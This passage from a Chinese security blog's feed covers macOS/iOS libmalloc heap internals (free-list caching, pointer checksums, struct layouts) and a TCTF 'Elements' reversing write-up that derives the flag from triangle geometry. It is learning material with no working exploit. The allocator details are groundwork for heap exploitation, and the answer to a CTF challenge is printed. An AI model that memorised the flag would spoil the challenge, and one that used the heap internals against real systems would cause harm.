(DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int num_magazines_mask_shift;    uint32_t debug_flags;    // array of per-processor magazines    magazine_t *magazines;    uintptr_t cookie;    uintptr_t last_madvise;} rack_t;</code></pre><h5 id="magazine-t-magazine-zone-h"><a href="#magazine-t-magazine-zone-h" class="headerlink" title="magazine_t // magazine_zone.h"></a>magazine_t // magazine_zone.h</h5><pre><code class="c">typedef struct magazine_s { // vm_allocate()&#39;d, so the array of magazines is page-aligned to begin with.    // Take magazine_lock first,  Depot lock when needed for recirc, then szone-&gt;{tiny,small}_regions_lock when needed for alloc    _malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN;    // Protection for the crtical section that does allocate_pages outside the magazine_lock    volatile boolean_t alloc_underway;    // One element deep &quot;death row&quot;, optimizes malloc/free/malloc for identical size.    void *mag_last_free;    msize_t mag_last_free_msize;    // msize for mag_last_free#if MALLOC_TARGET_64BIT    uint32_t _pad;#endif    region_t mag_last_free_rgn; // holds the region for mag_last_free    free_list_t mag_free_list[MAGAZINE_FREELIST_SLOTS];    uint32_t mag_bitmap[MAGAZINE_FREELIST_BITMAP_WORDS];    // the first and last free region in the last block are treated as big blocks in use that are not accounted for    size_t mag_bytes_free_at_end;    size_t mag_bytes_free_at_start;    region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start &gt; 0    // bean counting ...    size_t mag_num_bytes_in_objects;    size_t num_bytes_in_magazine;    unsigned mag_num_objects;    // recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria    // are located nearer to the head of the list than any region that doesn&#39;t satisfy that criteria.    // Doubly linked list for efficient extraction.    unsigned recirculation_entries;    region_trailer_t *firstNode;    region_trailer_t *lastNode;#if MALLOC_TARGET_64BIT    uintptr_t pad[320 - 14 - MAGAZINE_FREELIST_SLOTS -            (MAGAZINE_FREELIST_BITMAP_WORDS + 1) / 2];#else    uintptr_t pad[320 - 16 - MAGAZINE_FREELIST_SLOTS -            MAGAZINE_FREELIST_BITMAP_WORDS];#endif} magazine_t;</code></pre><h5 id="tiny-region-t-magazine-zone-h"><a href="#tiny-region-t-magazine-zone-h" class="headerlink" title="tiny_region_t //magazine_zone.h"></a>tiny_region_t //magazine_zone.h</h5><pre><code class="c">/* * Layout of a tiny region */typedef uint32_t tiny_block_t[4]; // assert(TINY_QUANTUM == sizeof(tiny_block_t))typedef struct tiny_header_inuse_pair {    uint32_t header;    uint32_t inuse;} tiny_header_inuse_pair_t;typedef struct region_trailer {    struct region_trailer *prev;    struct region_trailer *next;    boolean_t recirc_suitable;    volatile int pinned_to_depot;    unsigned bytes_used;    mag_index_t mag_index;} region_trailer_t;#define NUM_TINY_BLOCKS 64520typedef struct tiny_region {    tiny_block_t blocks[NUM_TINY_BLOCKS];    region_trailer_t trailer;    // The interleaved bit arrays comprising the header and inuse bitfields.    // The unused bits of each component in the last pair will be initialized to sentinel values.    tiny_header_inuse_pair_t pairs[CEIL_NUM_TINY_BLOCKS_WORDS];    uint8_t pad[TINY_REGION_SIZE - (NUM_TINY_BLOCKS * sizeof(tiny_block_t)) - TINY_METADATA_SIZE];} * tiny_region_t;</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="http://phrack.org/issues/63/5.html" target="_blank" rel="external">http://phrack.org/issues/63/5.html</a></p></li><li><p><a href="https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf" target="_blank" rel="external">https://www.synacktiv.com/ressources/Sthack_2018_Heapple_Pie.pdf</a></p></li><li><p><a href="https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf" target="_blank" rel="external">https://papers.put.as/papers/macosx/2016/Summercon-2016.pdf</a></p></li><li><p><a href="https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html" target="_blank" rel="external">https://www.cocoawithlove.com/2010/05/look-at-how-malloc-works-on-mac.html</a></p></li><li><p>&lt;&lt;<a href="https://repo.zenk-security.com/Magazine%20E-book/The%20Mac%20Hacker&#39;s%20Handbook.pdf" target="_blank" rel="external">the Mac Hacker’s Handbook</a>&gt;&gt; 第8章Exploiting Heap Overflows</p></li><li><p><a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">https://opensource.apple.com/source/libmalloc/</a> 源代码</p></li><li><p><a href="http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf" target="_blank" rel="external">http://www.mindfiresolutions.com/mindfire/Mac_Memory_Manager.pdf</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;源码解读macOS-iOS-Heap&quot;&gt;&lt;a href=&quot;#源码解读macOS-iOS-Heap&quot; class=&quot;headerlink&quot; title=&quot;源码解读macOS/iOS Heap&quot;&gt;&lt;/a&gt;源码解读macOS/iOS Heap&lt;/h3&gt;&lt;blockquo
      
    
    </summary>
    
      <category term="OS" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/OS/"/>
    
    
      <category term="heap" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>TCTF-Elements</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/27/TCTF-Elements/TCTF-Elements/</id>
    <published>2019-03-27T07:13:30.000Z</published>
    <updated>2019-03-28T07:06:17.336Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TCTF-Elements"><a href="#TCTF-Elements" class="headerlink" title="TCTF-Elements"></a>TCTF-Elements</h4><blockquote><p>这道题其实是一个数学问题，当时没有做出来，解题过程中走了很多弯路，踩了很多坑，不过也补了很多知识。</p></blockquote><h4 id="Elements"><a href="#Elements" class="headerlink" title="Elements"></a>Elements</h4><p>下面是main函数伪代码</p><pre><code class="c">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3){  char v3; // bl  const __int32_t **v4; // rax  char *v5; // rcx  size_t v6; // rcx  signed __int64 result; // rax  char *v8; // r12  signed __int64 v9; // r14  char v10; // bl  signed __int64 v11; // rax  const unsigned __int16 *v12; // rcx  signed __int64 v13; // rdx  __int64 v14; // rsi  unsigned __int16 v15; // bx  signed __int64 v16; // rsi  __m128i v17; // xmm0  char *v18; // rax  double v19; // xmm2_8  double v20; // xmm0_8  double v21; // xmm2_8  double v22; // xmm3_8  double v23; // [rsp+20h] [rbp-148h]  double v24; // [rsp+28h] [rbp-140h]  double v25; // [rsp+30h] [rbp-138h]  char s[8]; // [rsp+40h] [rbp-128h]  char v27; // [rsp+6Bh] [rbp-FDh]  fgets(s, 256, stdin);  v3 = s[0];  if ( s[0] )  {    v4 = __ctype_tolower_loc();    v5 = &amp;s[1];    do    {      *(v5 - 1) = (*v4)[v3];      v3 = *v5++;    }    while ( v3 );  }  v6 = strlen(s);  result = 0LL;  if ( v6 &gt;= 0x2C &amp;&amp; (*(_QWORD *)s &amp; 0xFFFFFFFFFFLL) == 530015415398LL &amp;&amp; v27 == 125 )  {    v27 = 0;    v8 = strtok(&amp;s[5], &quot;-&quot;);    v9 = 0LL;    if ( v8 )    {      while ( strlen(v8) == 12 )      {        v10 = *v8;        v11 = 0LL;        if ( *v8 )        {          v12 = *__ctype_b_loc();          v13 = 1LL;          v11 = 0LL;          do          {            v14 = v10;            v15 = v12[v10];            if ( (char)v14 &lt;= 102 &amp;&amp; v15 &amp; 0x400 )            {              v16 = v14 - 87;            }            else            {              if ( !(v15 &amp; 0x800) )                goto LABEL_31;              v16 = v14 - 48;            }            v11 = v16 | 16 * v11;            if ( v13 &gt; 11 )              break;            v10 = v8[v13++];          }          while ( v10 );        }        if ( !v9 &amp;&amp; v11 != 62791383142154LL )          break;        v17 = (__m128i)_mm_sub_pd(                         (__m128d)_mm_unpacklo_epi32((__m128i)(unsigned __int64)v11, (__m128i)xmmword_400BD0),                         (__m128d)xmmword_400BE0);        *(&amp;v23 + v9++) = COERCE_DOUBLE(_mm_shuffle_epi32(v17, 78)) + *(double *)v17.m128i_i64;        v18 = strtok(0LL, &quot;-&quot;);        v8 = v18;        if ( v9 &gt; 2 || !v18 )        {          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }          return 0LL;        }      }    }LABEL_31:    result = 0xFFFFFFFFLL;  }  return result;}</code></pre><p>这个题整个逻辑很清晰，前面一部分对输入的字符串做了一些格式和字符数量判断。</p><p>分析可得到需要输入以下格式<code>flag{xxxxxxxxxxxx-xxxxxxxxxxxx-xxxxxxxxxxxx}</code></p><p>这里通过<code>-</code>分割成三个部分，其中第一部分是已知的<code>391bc2164f0a</code>，后面就是程序验证逻辑</p><pre><code class="c">          if ( v24 &lt;= v23 || v25 &lt;= v24 || v23 + v24 &lt;= v25 )            break;          v19 = v24 * v24 + v23 * v23 - v25 * v25;          v20 = sqrt(4.0 * v23 * v23 * v24 * v24 - v19 * v19) * 0.25;          v21 = (v20 + v20) / (v23 + v24 + v25) + -1.940035480806554e13;          if ( v21 &lt; 0.00001 &amp;&amp; v21 &gt; -0.00001 )          {            v22 = v23 * v24 * v25 / (v20 * 4.0) + -4.777053952827391e13;            if ( v22 &lt; 0.00001 &amp;&amp; v22 &gt; -0.00001 )              puts(&quot;Congratz, input is your flag&quot;);          }</code></pre><p>当时一看其实就知道是一个三角形相关的运算，整理可得以下表达式</p><p>$c&gt;b,b&gt;a,a+b&gt;c$</p><p>$p=\frac{\sqrt{4a^2b^2-(a^2+b^2-c^2)^2)}}{2(a+b+c)}-1.940035480806554e13$</p><p>$q=\frac{abc}{(\sqrt{4a^2b^2-(a^2+b^2-c^2)^2})}-4.777053952827391e13$</p><p>$-0.00001&lt;p&lt;0.00001,-0.00001&lt;q&lt;0.00001 $</p><p>但并没有看出来是三角形内外圆的半径公式，所以想着直接上约束求解器z3</p><pre><code class="python">from z3 import *x = Real(&#39;x&#39;)y = Real(&#39;y&#39;)z = Real(&#39;z&#39;)m = Real(&#39;m&#39;)n = Real(&#39;n&#39;)p = Real(&#39;p&#39;)q = Real(&#39;q&#39;)solver = Solver()m = x*x+y*y-z*zn = (4.0*x*x*y*y-m*m)**0.5*0.25p = 2*n/(x+y+z) + (-1.940035480806554296875E13)q = x*y*z/(4.0*n) + (-4.777053952827391e13)solver.add(z &gt; y)solver.add(y &gt; x)solver.add(x + y &gt; z)solver.add(p &gt; -100,p&lt;100)solver.add(q &gt; -100,q&lt;100)solver.add(x == 6.2791383142154e13)if solver.check() == sat:    print(solver.model())else:    print(&#39;unsolve&#39;)</code></pre><p>结果求解了很久z3解不出来，后来才知道z3不能求解该类问题。z3文档中有提及只能解决非线性多项式约束，导致花了很长时间在思考是不是脚本的问题。然后用wolframalpha去求解也没有结果（目前还不清楚原因</p><p>下来思考了很久才知道是求解三角形的内外半径，通过内外圆的性质得到如下公式</p><p>$$Rr=\frac{abc}{2(a+b+c)}$$</p><p>$$tan\frac{C}{2} = \frac{2r}{a+b-c} = \frac{sinC}{1+cosC}$$</p><p>这里$sinC,cosC,R,r,c$都是已知的</p><p>所以联立能得到$$a=7.0802074077033E13,b=9.5523798483318E13 $$</p><p>得到对应的浮点数表示4064e4798769,56e0de138176</p><pre><code class="assembly">movq    xmm0, raxpunpckldq xmm0, xmmword ptr cs:qword_400BD0subpd   xmm0, cs:xmmword_400BE0pshufd  xmm1, xmm0, 4Ehaddpd   xmm1, xmm0movlpd  [rsp+r14*8+168h+var_148], xmm1</code></pre><p>在这里需要逆向求解出rax的值，即flag后面两部分。刚开始在这里卡了一下，感觉求解不出来。后面观察到qword_400BD0和xmmword_400BE0这两个数十分特殊</p><pre><code>qword_400BD0=0x4530000043300000xmmword_400BE0=0x45300000000000004330000000000000</code></pre><p>punpckldq指令会将qword_400BD0和rax分成两部分组合，这里恰好qword_400BD0为浮点数的阶数部分，rax为尾数部分</p><p>然后再分别与4530000000000000，4330000000000000相减。特殊在于这两个数阶数和上面对应相等，尾数部分为0，倒是相减结果又变回原始值。</p><p>所以其实这里的变换等于没有变换。</p><p>所以三个边长分别等于391bc2164f0a,4064e4798769,56e0de138176</p><p>最后的flag=flag{391bc2164f0a-4064e4798769-56e0de138176}</p><h4 id="补充：浮点数表示、运算、指令"><a href="#补充：浮点数表示、运算、指令" class="headerlink" title="补充：浮点数表示、运算、指令"></a>补充：浮点数表示、运算、指令</h4><p>浮点数有单精度和双精度之分，float占4个字节，double占8个字节</p><p>在表示小数的时候采用类比科学计数法的方法，把二进制小数转换为2为底的指数表示$V=(-1)^s<em>M</em>2^E$</p><p>e等于向左或向右移动到1为止的个数</p><p>比如：12.25   对应二进制：1100.01 这里需要向右移动三位$1.10001*2^3$</p><p>下面以float表示12.25这个数，分为三部分，符号位（1位）、指数（8位）、尾数（23位）</p><p>符号位0，指数3，尾数10001(第一位默认为1不需要表示)</p><p>由于指数也有负指数，所以其实还需要一位表示符号位， IEEE规定，小于01111111的指数位为负数</p><p>其实这里可以理解为首位表示符号位，这样的话采用如下计算出float指数部分表示<code>10000000+11-1=10000010</code></p><p>最后12.15单精度浮点数表示为：<code>0 10000010 10001000000000000000000</code> </p><p>十六进制：<code>0x41440000</code> 内存中小端表示：<code>00 00 44 41</code></p><table><thead><tr><th style="text-align:center">Float/Double</th><th style="text-align:center">符号位</th><th style="text-align:center">指数</th><th style="text-align:center">尾数</th><th style="text-align:left">示例</th><th style="text-align:left">16进制</th></tr></thead><tbody><tr><td style="text-align:center">Float</td><td style="text-align:center">1位</td><td style="text-align:center">8位</td><td style="text-align:center">23位</td><td style="text-align:left">0 10000010 10001000000000000000000</td><td style="text-align:left">41440000</td></tr><tr><td style="text-align:center">Double</td><td style="text-align:center">1位</td><td style="text-align:center">11位</td><td style="text-align:center">52位</td><td style="text-align:left">0 10000000010 1000100000000000000000000000 000000000000000000000000</td><td style="text-align:left">4028800000000000</td></tr></tbody></table><p>特殊的数表示：当全指数尾数全为0时，表示最小的数，这里定义为0；当指数全为1，尾数全为0时，表示最大的数，这里定义为无穷。</p><p>在线转换<a href="http://www.binaryconvert.com/" target="_blank" rel="external">http://www.binaryconvert.com/</a> </p><p>浮点数在进行加减运算的时候需要先对阶然后尾数部分运算</p><p>浮点数指令查询<a href="https://asm.inightmare.org/opcodelst/index.php" target="_blank" rel="external">https://asm.inightmare.org/opcodelst/index.php</a></p><p>这里解释下<code>pshufd  xmm1, xmm0, 4Eh</code>指令</p><p><code>pshufd</code>可以按照指定的方式重新排列数据</p><p>这里4E二进制<code>01 00 11 10</code></p><table><thead><tr><th>寄存器</th><th>值</th></tr></thead><tbody><tr><td>xmm0</td><td>42cc8d80 00000000 41e842c9 e1400000</td></tr><tr><td>4E</td><td>01               00                 11               10</td></tr><tr><td>xmm1</td><td>41e842c9 e1400000 42cc8d80 00000000</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;TCTF-Elements&quot;&gt;&lt;a href=&quot;#TCTF-Elements&quot; class=&quot;headerlink&quot; title=&quot;TCTF-Elements&quot;&gt;&lt;/a&gt;TCTF-Elements&lt;/h4&gt;&lt;blockquote&gt;
&lt;p&gt;这道题其实是一个数学问题，
      
    
    </summary>
    
      <category term="ctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/ctf/"/>
    
    
      <category term="tctf" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/tctf/"/>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>idapython learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/07/idapython-learning-note/idapython-learning-note/</id>
    <published>2019-03-07T11:42:24.000Z</published>
    <updated>2019-05-29T06:58:29.917Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="IDA" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IDA/"/>
    
    
  </entry>
  
  <entry>
    <title>1amb4ck</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/03/05/1amb4ck/1amb4ck/</id>
    <published>2019-03-05T15:26:30.000Z</published>
    <updated>2019-03-06T02:47:23.041Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" 